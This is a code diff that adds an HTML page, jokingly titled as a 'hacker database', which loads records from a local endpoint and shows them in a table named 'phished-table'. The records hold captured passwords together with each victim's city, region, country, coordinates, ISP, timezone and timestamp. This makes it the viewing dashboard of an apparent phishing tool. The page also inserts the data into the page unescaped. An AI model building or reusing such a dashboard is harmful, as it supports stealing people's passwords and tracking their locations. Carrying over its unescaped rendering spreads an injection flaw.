@@ -1,0 +1,67 @@
+<html>
+  <head>
+    <title>Hekel</title>
+    <meta charset="utf-8">
+  </head>
+  <body>
+    <div>
+      <h1>Database kocak-kocakan hekel</h1>
+      <table border="1" id="phished-table">
+        
+      </table>
+    </div>
+  </body>
+  <script>
+    const initTableRow = `
+      <tr>
+        <th>ID</th>
+        <th>Password</th>
+        <th>City</th>
+        <th>Region</th>
+        <th>Country</th>
+        <th>Coords</th>
+        <th>ISP</th>
+        <th>Timezone</th>
+        <th>Timestamp</th>
+      </tr>
+    `
+
+    const fetchPhishedData = async () => {
+      try {
+        const response = await fetch(`http://localhost:8080/passwords`)
+        const passwords = await response.json()
+  
+        const content = (() => {
+          if(passwords && passwords.length > 0) {
+            return passwords.map(password => {
+              return password
+                ? `
+                    <tr>
+                      <td>${password.id}</td>
+                      <td>${password.password}</td>
+                      <td>${password.city}</td>
+                      <td>${password.region}</td>
+                      <td>${password.country}</td>
+                      <td>${password.loc}</td>
+                      <td>${password.org}</td>
+                      <td>${password.timezone}</td>
+                      <td>${new Date(password.timestamp)}</td>
+                    </tr>
+                  `
+                : ``
+            }).join('')
+          } else {
+            return ``
+          }
+        })()
+        
+        // Send to phished table
+        document.querySelector('#phished-table').innerHTML = `${initTableRow}${content}`
+      } catch(e) {
+        console.error(e);
+      }
+    }
+
+    fetchPhishedData()
+  </script>
+</html>
